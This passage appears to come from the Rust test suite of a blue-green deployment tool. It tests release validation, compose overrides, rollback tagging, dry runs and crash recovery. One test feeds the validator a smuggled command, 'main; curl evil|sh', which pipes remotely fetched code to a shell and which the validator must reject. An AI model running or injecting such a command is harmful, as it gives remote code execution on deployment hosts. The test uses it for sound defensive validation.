        );

        // The recorded release is the live one: a bare resolve reports that
        // instead of silently redeploying it, unless the operator forces it.
        let err = resolve_release(&app, None, false).unwrap_err();
        assert!(matches!(err, DeployError::AlreadyLive { .. }), "{err:?}");
        assert!(err.to_string().contains("--force"), "{err}");
        assert_eq!(resolve_release(&app, None, true).unwrap(), "9c1f2ab");

        let mut bare = sample();
        bare.release = None;
        assert!(matches!(
            resolve_release(&bare, None, false).unwrap_err(),
            DeployError::NoRelease
        ));
    }

    #[test]
    fn resolve_refuses_a_non_commit_release() {
        let app = sample();
        for bad in [
            "main",
            "main; curl evil|sh",
            "abc",
            "abcd",
            "9c1f2ab ",
            "latest",
        ] {
            let err = resolve_release(&app, Some(bad), false).unwrap_err();
            assert!(
                matches!(err, DeployError::InvalidRelease(_)),
                "{bad:?} must be refused, got {err:?}"
            );
            assert!(
                err.to_string().contains("7-64"),
                "the range must match the registry validator: {err}"
            );
        }
        // A recorded release is checked the same way.
        let mut recorded = sample();
        recorded.release = Some("main".into());
        assert!(matches!(
            resolve_release(&recorded, None, false).unwrap_err(),
            DeployError::InvalidRelease(_)
        ));
    }

    #[test]
    fn a_seven_char_sha_is_accepted() {
        let app = sample();
        assert_eq!(
            resolve_release(&app, Some("abcd123"), false).unwrap(),
            "abcd123"
        );
    }

    #[test]
    fn live_status_answers_without_dialing_anything() {
        // No live port means nothing to probe: down, with the recorded identity
        // still reported. Both branches here return before a socket is opened.
        let mut app = sample_static();
        app.release = Some("9c1f2ab".into());
        let status = live_status(&app).unwrap();
        assert!(!status.up);
        assert_eq!(status.code, None);
        assert_eq!(status.release.as_deref(), Some("9c1f2ab"));

        // A health path that cannot go on a request line is a registry fault,
        // refused before the probe.
        let mut bad = app;
        bad.live_port = Some(1);
        bad.health_url = Some("http://127.0.0.1/a b".into());
        assert!(matches!(
            live_status(&bad).unwrap_err(),
            DeployError::InvalidHealthPath(_)
        ));
    }

    #[test]
    fn green_override_names_the_container() {
        let text = green_override("portfolio-green-9c1f2ab", "portfolio");
        assert!(
            text.contains("container_name: portfolio-green-9c1f2ab"),
            "{text}"
        );
        assert!(text.contains("portfolio:"), "{text}");
        assert!(
            !text.contains("ports:"),
            "ports come from the environment: {text}"
        );
        assert!(
            !text.contains("image:"),
            "image comes from the environment: {text}"
        );
    }

    #[test]
    fn green_override_paths_live_in_the_state_dir() {
        assert_eq!(
            green_override_path(Path::new("/srv/swapdock/green"), "portfolio"),
            PathBuf::from("/srv/swapdock/green/portfolio.yml")
        );
    }

    #[test]
    fn adopt_override_pins_image_and_replaces_the_published_port() {
        let text = adopt_override(
            "chats",
            "CHATS_PORT",
            3000,
            9016,
            "charon-chats",
            Some("node -e \"fetch('http://127.0.0.1:3000/').then(r=>process.exit(r.ok?0:1))\""),
        );
        assert!(text.contains("image: ${IMAGE:-charon-chats}"), "{text}");
        assert!(text.contains("ports: !override"), "{text}");
        assert!(
            text.contains("127.0.0.1:${CHATS_PORT:-9016}:3000"),
            "{text}"
        );
        assert!(text.contains("CMD-SHELL"), "{text}");
        assert!(text.contains("start_period: 10s"), "{text}");
    }

    #[test]
    fn adopt_override_can_leave_an_existing_healthcheck_alone() {
        let text = adopt_override("app", "APP_PORT", 80, 9002, "app-image", None);
        assert!(!text.contains("healthcheck:"), "{text}");
        assert!(text.contains("!override"), "{text}");
    }

    #[test]
    fn adopt_override_path_lives_beside_the_green_state() {
        assert_eq!(
            adopt_override_path(Path::new("/srv/swapdock/green"), "chats"),
            PathBuf::from("/srv/swapdock/overrides/chats.yml")
        );
    }

    #[test]
    fn short_sha_never_panics_on_short_input() {
        assert_eq!(short_sha("9c1f2ab"), "9c1f2ab");
        assert_eq!(
            short_sha("9c1f2ab0123456789abcdef0123456789abcdef"),
            "9c1f2ab"
        );
        assert_eq!(short_sha("abc"), "abc");
        assert_eq!(short_sha(""), "");
    }

    // ---- rollback tag integrity ----

    #[test]
    fn retain_targets_the_replaced_release_not_the_rollback_release() {
        // Forward deploy r2 -> r3: the outgoing image is r2, so the r2 tag is
        // what a later rollback needs. Tagging it r1 (the recorded old_release)
        // would overwrite the image a rollback is about to deploy.
        let mut app = sample();
        app.release = Some("aaaa111".into());
        app.old_release = Some("bbbb222".into());
        assert_eq!(
            retain_plan(&app, Some("aaaa111"), "cccc333"),
            RetainPlan::Tag {
                release: "aaaa111".into(),
                target: "apps-portfolio:aaaa111".into(),
            }
        );

        // Rollback r2 -> r1: old_release *is* the target. The outgoing image is
        // still r2 and must be tagged r2, never r1.
        assert_eq!(
            retain_plan(&app, Some("aaaa111"), "bbbb222"),
            RetainPlan::Tag {
                release: "aaaa111".into(),
                target: "apps-portfolio:aaaa111".into(),
            }
        );
    }

    #[test]
    fn retain_skips_a_force_redeploy_of_the_live_release() {
        let app = sample();
        let plan = retain_plan(&app, Some("9c1f2ab"), "9c1f2ab");
        assert!(matches!(plan, RetainPlan::Skip(_)), "{plan:?}");
        assert!(format!("{plan:?}").contains("force redeploy"), "{plan:?}");
    }

    #[test]
    fn retain_skips_without_a_previous_release_or_image_repo() {
        let app = sample();
        assert!(matches!(
            retain_plan(&app, None, "9c1f2ab"),
            RetainPlan::Skip(_)
        ));

        let mut no_repo = sample();
        no_repo.image_repo = None;
        assert!(matches!(
            retain_plan(&no_repo, Some("9c1f2ab"), "abc1234"),
            RetainPlan::Skip(_)
        ));
    }

    #[test]
    fn an_existing_tag_pointing_at_another_image_is_never_overwritten() {
        assert_eq!(tag_decision(None, "sha256:aaa"), TagDecision::Tag);
        assert_eq!(
            tag_decision(Some("sha256:aaa"), "sha256:aaa"),
            TagDecision::AlreadyTagged
        );
        assert_eq!(
            tag_decision(Some("sha256:bbb"), "sha256:aaa"),
            TagDecision::Conflict
        );

        // A conflict must become a hard error that names everything needed to
        // reconcile provenance, and says the old container was not stopped.
        let err = DeployError::TagConflict {
            container: "portfolio-live".into(),
            tag: "apps-portfolio:aaaa111".into(),
            existing_image_id: "sha256:bbb".into(),
            live_image_id: "sha256:aaa".into(),
        };
        let message = err.to_string();
        for expected in [
            "portfolio-live",
            "apps-portfolio:aaaa111",
            "sha256:bbb",
            "sha256:aaa",
            "left running",
        ] {
            assert!(
                message.contains(expected),
                "missing {expected:?}: {message}"
            );
        }
    }

    // ---- swap preflight ----

    #[test]
    fn the_swap_refusal_explains_replace_or_bind_mounts() {
        let err = DeployError::SwapUnsafe {
            app: "app".into(),
            reasons: "named volume \"data\"".into(),
        };
        let message = err.to_string();
        assert!(message.contains("cannot swap"), "{message}");
        assert!(message.contains("strategy = \"replace\""), "{message}");
        assert!(message.contains("writes_state = true"), "{message}");
        assert!(message.contains("bind mounts"), "{message}");
    }

    // ---- dry run ----

    #[test]
    fn probe_front_retries_the_reload_race_and_records_the_answer() {
        // An nginx reload is asynchronous: the first request after it can still
        // be answered by an old worker. This listener answers 502 once, then
        // 200, which is exactly that window.
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            for (attempt, stream) in listener.incoming().enumerate() {
                let Ok(mut stream) = stream else { return };
                let mut buf = [0u8; 512];
                let _ = std::io::Read::read(&mut stream, &mut buf);
                let status = if attempt == 0 {
                    "HTTP/1.1 502 Bad Gateway"
                } else {
                    "HTTP/1.1 200 OK"
                };
                let _ = std::io::Write::write_all(
                    &mut stream,
                    format!("{status}\r\nContent-Length: 0\r\n\r\n").as_bytes(),
                );
            }
        });

        let dir = tempfile::TempDir::new().unwrap();
        let trace = dir.path().join("swapdock.jsonl");
        let mut run = Run::start(
            TraceLog::open(&trace).unwrap(),
            RunMode::Live,
            Some("portfolio".into()),
            &["swapdock".to_string()],
            crate::redact::Redactor::new(),
        )
        .unwrap();
        let mut app = sample();
        app.front_port = port;

        probe_front(&mut run, &app).expect("a 502 followed by a 200 is not a failed deploy");

        let read = TraceLog::read(&trace).unwrap();
        let probe = read
            .events
            .iter()
            .find_map(|e| match e {
                crate::trace::TraceEvent::Step {
                    step,
                    status,
                    detail,
                    ..
                } if step == "probe-front" => Some((*status, detail.clone())),
                _ => None,
            })
            .expect("probe-front must be recorded");
        assert_eq!(probe.0, crate::trace::StepStatus::Ok);
        assert_eq!(probe.1.unwrap()["status"], 200);
    }

    #[test]
    fn a_dry_run_swap_reaches_registry_commit_without_a_live_container() {
        let dir = tempfile::TempDir::new().unwrap();
        let registry_dir = dir.path().join("apps");
        std::fs::create_dir_all(&registry_dir).unwrap();

        let mut app = sample();
        app.live_port = None;
        app.old_port = None;
        app.release = None;
        app.old_release = None;
        app.compose_dir = dir.path().join("compose");
        std::fs::create_dir_all(&app.compose_dir).unwrap();
        std::fs::write(app.compose_dir.join("compose.yaml"), "services: {}\n").unwrap();
        registry::save_app(&registry_dir, &app).unwrap();

        let ctx = DeployContext {
            registry_dir: registry_dir.clone(),
            state_dir: dir.path().join("green"),
            lock_dir: dir.path().join("locks"),
            apply_paths: ApplyPaths {
                nginx_bin: PathBuf::from("nginx"),
                main_config: dir.path().join("nginx.conf"),
                target: dir.path().join("front-door.conf"),
                pid_file: None,
            },
            drain_secs: 1,
            lock_timeout: Duration::from_secs(5),
        };

        let trace = dir.path().join("swapdock.jsonl");
        let log = crate::trace::TraceLog::open(&trace).unwrap();
        let mut run = Run::start(
            log,
            RunMode::DryRun,
            Some(app.name.clone()),
            &["swapdock".to_string()],
            crate::redact::Redactor::new(),
        )
        .unwrap();

        run_swap(&mut run, &ctx, &mut app, "abc1234")
            .expect("a dry-run must not fail at the health gate");
        run.finish(crate::trace::RunStatus::DryRun).unwrap();

        // The commit is recorded as a plan, not applied.
        assert_eq!(app.release.as_deref(), Some("abc1234"));
        assert_eq!(app.live_port, Some(9000), "slot 0 starts on 9000");
        let read = crate::trace::TraceLog::read(&trace).unwrap();
        let steps: Vec<(&str, crate::trace::StepStatus)> = read
            .events
            .iter()
            .filter_map(|e| match e {
                crate::trace::TraceEvent::Step { step, status, .. } => {
                    Some((step.as_str(), *status))
                }
                _ => None,
            })
            .collect();
        let commit = steps
            .iter()
            .find(|(step, _)| *step == "registry-commit")
            .expect("dry-run must reach registry-commit");
        assert_eq!(commit.1, crate::trace::StepStatus::DryRun, "{steps:?}");
        assert!(
            steps.iter().all(|(_, status)| !status.is_failure()),
            "no dry-run step may be logged as a failure: {steps:?}"
        );
        assert!(
            steps.iter().any(|(step, _)| *step == "swap-preflight"),
            "the swap preflight must be visible in the plan: {steps:?}"
        );

        // Nothing was written and no lock file was created.
        assert!(!ctx.apply_paths.target.exists(), "no nginx file in dry-run");
        assert!(!ctx.state_dir.exists(), "no green override in dry-run");
        assert!(!ctx.lock_dir.exists(), "no lock files in dry-run");
    }

    #[test]
    fn a_crash_after_a_static_flip_is_reconciled_from_the_journal() {
        let _serial = STATIC_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
        use std::io::{Read, Write};
        use std::net::TcpListener;
        use std::os::unix::fs::PermissionsExt;

        let root_parent = std::path::Path::new("/srv/www");
        // Writability, not existence: `/srv/www` is root-owned on a normal host
        // and `create_dir_all` happily succeeds on a directory it cannot write.
        let Ok(dir) = tempfile::TempDir::new_in(root_parent) else {
            eprintln!("SKIP a_crash_after_static_flip: /srv/www is not writable");
            return;
        };
        let registry_dir = dir.path().join("apps");
        std::fs::create_dir_all(&registry_dir).unwrap();
        let root = dir.path().join("www/docs/current");
        std::fs::create_dir_all(root.parent().unwrap()).unwrap();
        let release_dir = root.parent().unwrap().join("releases/abc1234");
        std::fs::create_dir_all(&release_dir).unwrap();
        std::fs::write(release_dir.join("index.html"), "ok").unwrap();

        let probe = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = probe.local_addr().unwrap().port();
        drop(probe);
        let listener = TcpListener::bind(("127.0.0.1", port)).unwrap();
        let server = std::thread::spawn(move || {
            if let Ok((mut stream, _)) = listener.accept() {
                let mut request = [0u8; 1024];
                let _ = stream.read(&mut request);
                let _ = stream.write_all(
                    b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok",
                );
            }
        });

        let mut app = sample_static();
        app.root = Some(root.display().to_string());
        app.hostnames = vec!["docs.test".into()];
        app.front_port = port;
        app.release = None;
        app.old_release = None;
        app.live_port = None;
        app.old_port = None;
        registry::save_app(&registry_dir, &app).unwrap();

        let nginx = dir.path().join("fake-nginx");
        std::fs::write(
            &nginx,
            "#!/bin/sh\ncase \"$1\" in -t|-s) exit 0;; esac\nexit 0\n",
        )
        .unwrap();
        std::fs::set_permissions(&nginx, std::fs::Permissions::from_mode(0o755)).unwrap();
        let main_config = dir.path().join("nginx.conf");
        std::fs::write(&main_config, "events {}\nhttp {}\n").unwrap();
        let ctx = DeployContext {
            registry_dir: registry_dir.clone(),
            state_dir: dir.path().join("green"),
            lock_dir: dir.path().join("locks"),
            apply_paths: ApplyPaths {
                nginx_bin: nginx,
                main_config,
                target: dir.path().join("front-door.conf"),
                pid_file: None,
            },
            drain_secs: 0,
            lock_timeout: Duration::from_secs(5),
        };
        let trace = dir.path().join("swapdock.jsonl");
        let mut run = Run::start(
            TraceLog::open(&trace).unwrap(),
            RunMode::Live,
            Some(app.name.clone()),
            &["swapdock".to_string()],
            crate::redact::Redactor::new(),
        )
        .unwrap();
        // The process "dies" here: the symlink and journal are already on disk.
        crate::test_env::set_var("SWAPDOCK_FAILPOINT", "static-flipped");
        let result = run_static(&mut run, &ctx, &mut app, "abc1234");
        crate::test_env::remove_var("SWAPDOCK_FAILPOINT");
        let _ = run.finish(crate::trace::RunStatus::Failed);
        assert!(result.is_err(), "failpoint must abort the deploy");
        assert_eq!(
            journal::read(&ctx.state_dir, "docs")
                .unwrap()
                .map(|p| p.release),
            Some("abc1234".into()),
            "the crash must leave a pending journal"
        );
        assert_eq!(
            std::fs::read_link(&root).unwrap(),
            std::path::Path::new("releases/abc1234"),
            "the flip happened before the crash"
        );

        let mut run = Run::start(
            TraceLog::open(&trace).unwrap(),
            RunMode::Live,
            Some(app.name.clone()),
            &["swapdock".to_string(), "reconcile".to_string()],
            crate::redact::Redactor::new(),
        )
        .unwrap();
        let outcome = crate::reconcile::reconcile(&mut run, &ctx, &mut app).unwrap();
        let _ = run.finish(crate::trace::RunStatus::Ok);
        assert!(matches!(
            outcome,
            crate::reconcile::Outcome::Committed { .. }
        ));
        assert_eq!(app.release.as_deref(), Some("abc1234"));
        assert!(journal::read(&ctx.state_dir, "docs").unwrap().is_none());
        server.join().unwrap();
    }

    #[test]
    fn a_live_static_deploy_flips_the_symlink_and_commits() {
        let _serial = STATIC_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
        use std::io::{Read, Write};
        use std::net::TcpListener;
        use std::os::unix::fs::PermissionsExt;

        // `/tmp` is deliberately rejected as a static root and this harness only
        // writes under the workspace. CI creates the real allowed root; local
        // unprivileged runs skip the test rather than weakening the validator.
        let root_parent = std::path::Path::new("/srv/www");
        if std::fs::create_dir_all(root_parent).is_err() {
            eprintln!("SKIP a_live_static_deploy: /srv/www is not writable");
            return;
        }
        let dir = match tempfile::TempDir::new_in(root_parent) {
            Ok(dir) => dir,
            Err(e) => {
                eprintln!("SKIP a_live_static_deploy: {e}");
                return;
            }
        };
        let registry_dir = dir.path().join("apps");
        std::fs::create_dir_all(&registry_dir).unwrap();

        let root = dir.path().join("www/docs/current");
        std::fs::create_dir_all(root.parent().unwrap()).unwrap();
        // The release directory is produced by the build step; create it here
        // so this test exercises the symlink flip, not a missing-artifact error.
        let release_dir = root.parent().unwrap().join("releases/abc1234");
        std::fs::create_dir_all(&release_dir).unwrap();
        std::fs::write(release_dir.join("index.html"), "ok").unwrap();

        // Find a free loopback port, then serve the static front door there.
        let probe = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = probe.local_addr().unwrap().port();
        drop(probe);
        let listener = TcpListener::bind(("127.0.0.1", port)).unwrap();
        let server = std::thread::spawn(move || {
            if let Ok((mut stream, _)) = listener.accept() {
                let mut request = [0u8; 1024];
                let _ = stream.read(&mut request);
                let _ = stream.write_all(
                    b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok",
                );
            }
        });

        let mut app = sample_static();
        app.root = Some(root.display().to_string());
        app.hostnames = vec!["docs.test".into()];
        app.front_port = port;
        app.release = None;
        app.old_release = None;
        app.live_port = None;
        app.old_port = None;
        registry::save_app(&registry_dir, &app).unwrap();

        let nginx = dir.path().join("fake-nginx");
        std::fs::write(
            &nginx,
            "#!/bin/sh\ncase \"$1\" in -t|-s) exit 0;; esac\nexit 0\n",
        )
        .unwrap();
        std::fs::set_permissions(&nginx, std::fs::Permissions::from_mode(0o755)).unwrap();
        let main_config = dir.path().join("nginx.conf");
        std::fs::write(&main_config, "events {}\nhttp {}\n").unwrap();

        let ctx = DeployContext {
            registry_dir: registry_dir.clone(),
            state_dir: dir.path().join("green"),
            lock_dir: dir.path().join("locks"),
            apply_paths: ApplyPaths {
                nginx_bin: nginx,
                main_config,
                target: dir.path().join("front-door.conf"),
                pid_file: None,
            },
            drain_secs: 0,
            lock_timeout: Duration::from_secs(5),
        };
        let trace = dir.path().join("swapdock.jsonl");
        let mut run = Run::start(
            crate::trace::TraceLog::open(&trace).unwrap(),
            RunMode::Live,
            Some(app.name.clone()),
            &["swapdock".to_string()],
            crate::redact::Redactor::new(),
        )
        .unwrap();

        run_static(&mut run, &ctx, &mut app, "abc1234").expect("static deploy");
        run.finish(crate::trace::RunStatus::Ok).unwrap();
        server.join().unwrap();

        assert_eq!(app.release.as_deref(), Some("abc1234"));
        assert_eq!(app.live_port, Some(port));
        let target = std::fs::read_link(&root).unwrap();
        assert!(target.ends_with("releases/abc1234"), "{target:?}");
        let saved = crate::registry::load_dir(&registry_dir).unwrap();
        let saved = saved
            .apps
            .iter()
            .find(|candidate| candidate.name == "docs")
            .unwrap();
        assert_eq!(saved.release.as_deref(), Some("abc1234"));
        let rendered = std::fs::read_to_string(&ctx.apply_paths.target).unwrap();
        assert!(
            rendered.contains(&format!("root {};", root.display())),
            "{rendered}"
        );
    }

    #[test]
    fn a_dry_run_static_deploy_reaches_registry_commit() {
        // Same `/srv/www` root and same failpoint window as the other static
        // tests: it must not run while one of those is armed.
        let _serial = STATIC_SERIAL.lock().unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::TempDir::new().unwrap();
        let registry_dir = dir.path().join("apps");
        std::fs::create_dir_all(&registry_dir).unwrap();

        let mut app = sample_static();
        app.root = Some("/srv/www/docs/current".into());
        app.release = None;
        app.old_release = None;
        app.live_port = None;
        app.old_port = None;
        registry::save_app(&registry_dir, &app).unwrap();

        let ctx = DeployContext {
            registry_dir: registry_dir.clone(),
            state_dir: dir.path().join("green"),
            lock_dir: dir.path().join("locks"),
            apply_paths: ApplyPaths {
                nginx_bin: PathBuf::from("nginx"),
                main_config: dir.path().join("nginx.conf"),
                target: dir.path().join("front-door.conf"),
                pid_file: None,
            },
            drain_secs: 0,
            lock_timeout: Duration::from_secs(5),
        };

        let trace = dir.path().join("swapdock.jsonl");
        let mut run = Run::start(
            crate::trace::TraceLog::open(&trace).unwrap(),
            RunMode::DryRun,
            Some(app.name.clone()),
            &["swapdock".to_string()],
            crate::redact::Redactor::new(),
        )
        .unwrap();

        run_static(&mut run, &ctx, &mut app, "abc1234")
            .expect("static dry-run must not touch the symlink");
        run.finish(crate::trace::RunStatus::DryRun).unwrap();

        assert_eq!(app.release.as_deref(), Some("abc1234"));
        assert_eq!(app.live_port, Some(app.front_port));
        let read = crate::trace::TraceLog::read(&trace).unwrap();
        let steps: Vec<(&str, crate::trace::StepStatus)> = read
            .events
            .iter()
            .filter_map(|event| match event {
                crate::trace::TraceEvent::Step { step, status, .. } => {
                    Some((step.as_str(), *status))
                }
                _ => None,
            })
            .collect();
        assert!(
            steps.iter().any(|(step, status)| *step == "static-flip"
                && *status == crate::trace::StepStatus::DryRun),
            "{steps:?}"
        );
        assert!(
            steps.iter().any(|(step, status)| *step == "registry-commit"
                && *status == crate::trace::StepStatus::DryRun),
            "{steps:?}"
        );
        assert!(
            steps.iter().all(|(_, status)| !status.is_failure()),
            "{steps:?}"
        );
        assert!(!ctx.apply_paths.target.exists());
    }
}
